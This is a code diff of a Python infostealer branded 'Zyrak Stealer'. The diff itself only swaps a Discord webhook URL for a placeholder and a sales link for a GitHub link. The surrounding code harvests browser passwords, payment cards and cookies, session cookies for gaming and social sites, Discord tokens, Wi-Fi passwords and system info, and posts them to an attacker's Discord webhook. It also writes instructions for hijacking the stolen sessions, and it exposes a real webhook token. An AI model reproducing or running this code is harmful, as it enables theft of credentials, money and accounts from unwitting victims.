@@ -14,7 +14,7 @@ import base64
 import time
 
 
-webhook = 'https://discord.com/api/webhooks/1256641409952514118/I9PT4ApUwOIfE_378SoVlm6MvBqBYGqLl4uq39AuAfmWcIEhc8DRIi7DkwMkIMj3igL8'
+webhook = 'YOUR_WEBHOOK_URL'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
@@ -651,7 +651,7 @@ class Main:
                 if found_ubisoft == True:
                     os.mkdir(os.path.join(copied_path, "How to Use"))
                     with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                        write_file.write("https://zyraktools.sellsn.io/\n==============================================\n")
+                        write_file.write("https://github.com/hellowsecretcount/zyrak\n==============================================\n")
                         write_file.write("First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft")
         except:
             pass
@@ -670,7 +670,7 @@ class Main:
                     pass
             if found_epic == True:
                 with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
-                    write_file.write("https://zyraktools.sellsn.io/\n==============================================\n")
+                    write_file.write("https://github.com/hellowsecretcount/zyrak\n==============================================\n")
                     write_file.write("First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games")
         except Exception as e:
             print(str(e))
@@ -685,7 +685,7 @@ class Main:
             if found_growtopia == True:
                 os.mkdir(os.path.join(copied_path, "How to Use"))
                 with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                    write_file.write("https://zyraktools.sellsn.io/\n==============================================\n")
+                    write_file.write("https://github.com/hellowsecretcount/zyrak\n==============================================\n")
                     write_file.write("First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file.")
         except:
             pass
@@ -714,7 +714,7 @@ class Main:
                 if found_tg == True:
                     os.mkdir(os.path.join(copy_path, "How to Use"))
                     with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
-                        write_file.write("https://zyraktools.sellsn.io/\n=======================================\n")
+                        write_file.write("https://github.com/hellowsecretcount/zyrak\n=======================================\n")
                         write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
         except:
             pass
@@ -727,9 +727,9 @@ class Main:
                 embed_data = {
                     "title": "**Zyrak Grabber**",
                     "description": f"**Zyrak Riot Games Session was detected on the {browser} browser**",
-                    "url" : "https://zyraktools.sellsn.io/",
+                    "url" : "https://github.com/hellowsecretcount/zyrak",
                     "color": 0,
-                    "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                    "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                     "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
                 username = str(response["username"])
                 email = str(response["email"])
@@ -747,7 +747,7 @@ class Main:
                     {"name": "<a:_:1257044690130436118> Cookie", "value": "``" + cookie + "``", "inline": False},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -801,9 +801,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Zyrak Instagram Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
@@ -818,7 +818,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -861,9 +861,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Zyrak Tiktok Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
@@ -876,7 +876,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -933,9 +933,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Zyrak Twitter Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256629996169072670> Username", "value": "``" + username + "``", "inline": True},
@@ -952,7 +952,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1017,9 +1017,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Zyrak Twitch Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256629996169072670> Username", "value": "``" + str(login) + "``", "inline": True},
@@ -1036,7 +1036,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "https://zyraktools.sellsn.io/ | Zyrak Stealer",
+                    "username": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1073,9 +1073,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Zyrak Spotify Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:mail:1095741024678191114> Email", "value": "``" + str(email) + "``", "inline": True},
@@ -1088,7 +1088,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1139,9 +1139,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Waltuhium Reddit Session was detected on the {browser} browser**",
-                "url" : "https://zyraktools.sellsn.io/ ",
+                "url" : "https://github.com/hellowsecretcount/zyrak ",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256629996169072670> Username", "value": "``" + str(username) + "``", "inline": True},
@@ -1158,7 +1158,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "https://zyraktools.sellsn.io/ | Zyrak Stealer",
+                    "username": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer",
                     "embeds": [embed_data]
                 }
                 headers = {
@@ -1190,9 +1190,9 @@ class Main:
                 embed_data = {
                     "title": "**Zyrak Grabber**",
                     "description": f"**Zyrak Roblox Session was detected on the {browser} browser**",
-                    "url" : "https://zyraktools.sellsn.io/",
+                    "url" : "https://github.com/hellowsecretcount/zyrak",
                     "color": 0,
-                    "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                    "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                     "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
                 fields = [
                     {"name": "<:_:1256629996169072670> Name", "value": "``" + str(name) + "``", "inline": True},
@@ -1204,7 +1204,7 @@ class Main:
                     {"name": "<a:_:1257044690130436118> Cookie", "value": "```" + str(cookie) + "```", "inline": True},]
                 embed_data["fields"] = fields
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data]
                 }
                 headers2 = {
@@ -1445,9 +1445,9 @@ class Main:
                 embed_data = {
                 "title": "**Zyrak Discord Grabber**",
                 "description": f"**Successfully found**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
                 if pp:
                     embed_data["thumbnail"]["url"] = pp
@@ -1471,7 +1471,7 @@ class Main:
                 embed_data["fields"] = fields
                 async with aiohttp.ClientSession() as session:
                     payload = {
-                        "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                        "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                         "embeds": [embed_data]
                     }
                     headers = {
@@ -1516,9 +1516,9 @@ class Main:
                                 embed_data = {
                                     "title": "**Zyrak Grabber**",
                                     "description": f"**Zyrak Steam Detected**",
-                                    "url" : "https://zyraktools.sellsn.io/",
+                                    "url" : "https://github.com/hellowsecretcount/zyrak",
                                     "color": 0,
-                                    "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                                    "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                                     "thumbnail": {"url": avatar}}
                                 fields = [
                                         {"name": "<:_:1256629996169072670> Username", "value": "``" + str(personname) + "``", "inline": True},
@@ -1530,7 +1530,7 @@ class Main:
                                 embed_data["fields"] = fields
                                 async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                     payload = {
-                                        "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                                        "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                                         "embeds": [embed_data]
                                     }
                                     headers = {
@@ -1550,7 +1550,7 @@ class Main:
                     os.mkdir(to_path)
                 shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
                 with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
-                    file.write("https://zyraktools.sellsn.io/\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
+                    file.write("https://github.com/hellowsecretcount/zyrak\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
         except:
             return "null"
     
@@ -1610,137 +1610,137 @@ class Main:
             processList = Variables.Processes
             if processList:
                 with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for proc in processList:
                         file.write(proc)
             if Variables.ClipBoard:
                 with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for lstclip in Variables.ClipBoard:
                         file.write(lstclip)
             if self.FirefoxCookieList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for fcookie in self.FirefoxCookieList:
                         file.write(fcookie)
             if self.FirefoxHistoryList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "History.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for fhistory in self.FirefoxHistoryList:
                         file.write(fhistory)
             if self.FirefoxAutofiList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for fautofill in self.FirefoxAutofiList:
                         file.write(fautofill)
             if password_list:
                 with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for passwords in password_list:
                         file.write(passwords)
             if card_list:
                 with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for cards in card_list:
                         file.write(cards)
             if cookie_list:
                 with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for cookies in cookie_list:
                         file.write(cookies)
             if history_list:
                 with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for historys in history_list:
                         file.write(historys)
             if autofill_list:
                 with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for autofill in autofill_list:
                         file.write(autofill)
             if bookmark_list:
                 with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for bookmark in bookmark_list:
                         file.write(bookmark)           
             if download_list:
                 with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for downloads in download_list:
                         file.write(downloads)
             if riot_acc:
                 with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for riotgames in riot_acc:
                         file.write(riotgames)
             if insta_acc:
                 with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for insta in insta_acc:
                         file.write(insta)
             if tiktok_acc:
                 with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for tiktok in tiktok_acc:
                         file.write(tiktok)
             if twitter_acc:
                 with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for twitter in twitter_acc:
                         file.write(twitter)
             if reddit_acc:
                 with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for reddit in reddit_acc:
                         file.write(reddit)
             if twitch_acc:
                 with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for twitch in twitch_acc:
                         file.write(twitch)
             if spotify_acc:
                 with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for spotify in spotify_acc:
                         file.write(spotify)
             if roblox_acc:
                 with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for roblox in roblox_acc:
                         file.write(roblox)
             if steam_acc:
                 with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for steam in steam_acc:
                         file.write(steam)
             if Variables.DiscordAccounts:
                 with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for discord in Variables.DiscordAccounts:
                         file.write(discord)
             if Variables.FullTokens:
                 with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for token in Variables.FullTokens:
                         file.write(token + "\n")    
             if Variables.ValidatedTokens:
                 with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for validated_token in Variables.ValidatedTokens:
                         file.write(validated_token + "\n")   
             if Variables.Wifis:
                 with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for profile_name, profile_password in Variables.Wifis:
                         file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
             if Variables.SystemInfo:
                 with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for sysmteminfo in Variables.SystemInfo:
                         file.write(str(sysmteminfo))
             if Variables.Network:
                 with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://zyraktools.sellsn.io/----------------------\n"+ "=" * 70 + "\n")
+                    file.write("----------------------https://github.com/hellowsecretcount/zyrak----------------------\n"+ "=" * 70 + "\n")
                     for ip, country,city, timezone, isp in Variables.Network:
                         file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
@@ -1799,9 +1799,9 @@ class Main:
             embed_data = {
                 "title": "**Zyrak Grabber**",
                 "description": f"**Keyword Result**",
-                "url" : "https://zyraktools.sellsn.io/",
+                "url" : "https://github.com/hellowsecretcount/zyrak",
                 "color": 0,
-                "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                 "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
             fields = [
                 {"name": "<:_:1256993776564568237> Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
@@ -1810,7 +1810,7 @@ class Main:
             embed_data["fields"] = fields
             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                 payload = {
-                    "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                    "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                     "embeds": [embed_data] }
                 headers = {
                     "Content-Type": "application/json"}
@@ -1835,9 +1835,9 @@ class Main:
         embed_data = {
             "title": "**Zyrak Grabber**",
             "description": f"**Zyrak Grabber Full Info**",
-            "url" : "https://zyraktools.sellsn.io/",
+            "url" : "https://github.com/hellowsecretcount/zyrak",
             "color": 0,
-            "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+            "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
             "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
         fields = [
              {"name": "<:_:1256993776564568237> Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
@@ -1862,7 +1862,7 @@ class Main:
         embed_data["fields"] = fields
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
             payload = {
-                "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                 "embeds": [embed_data] }
             headers = {
                  "Content-Type": "application/json"}
@@ -1884,14 +1884,14 @@ class Main:
                     embed_data2 = {
                         "title": "**Zyrak Grabber**",
                         "description": f"**Zyrak Grabber Full Info**",
-                        "url" : "https://zyraktools.sellsn.io/",
+                        "url" : "https://github.com/hellowsecretcount/zyrak",
                         "color": 0,
-                        "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                        "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                         "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                        "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                        "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                         "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
@@ -2066,14 +2066,14 @@ class StealCommonFiles:
                     embed_data2 = {
                             "title": "**Zyrak Grabber**",
                             "description": f"**Grabbed Files**",
-                            "url" : "https://zyraktools.sellsn.io/ ",
+                            "url" : "https://github.com/hellowsecretcount/zyrak ",
                             "color": 0,
-                            "footer": {"text": "https://zyraktools.sellsn.io/ | Zyrak Stealer"},
+                            "footer": {"text": "https://github.com/hellowsecretcount/zyrak | Zyrak Stealer"},
                             "thumbnail": {"url": "https://i.imgur.com/sq3bPxa.png"}}
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
-                                "username": "Zyrak Stealer | https://zyraktools.sellsn.io/",
+                                "username": "Zyrak Stealer | https://github.com/hellowsecretcount/zyrak",
                                 "embeds": [embed_data2] }
                     async with session.post(webhook, json=payload2) as req:
                         pass
